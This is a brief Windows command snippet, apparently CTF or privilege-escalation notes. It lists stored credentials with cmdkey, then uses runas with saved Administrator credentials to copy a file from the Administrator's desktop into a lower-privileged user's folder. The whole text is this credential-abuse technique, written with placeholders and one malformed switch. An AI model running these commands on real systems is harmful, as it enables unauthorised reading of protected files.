```sh
C:\Users\<username> >>
>> cmdkey \list

>> C:\Windows/System32\runas.exe /user:<user access: ACCESS\Administrator> /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\<Administrator>\<Desktop>\<filetoread.txt> > C:\Users\<username: security>\<destfilename.txt>"
```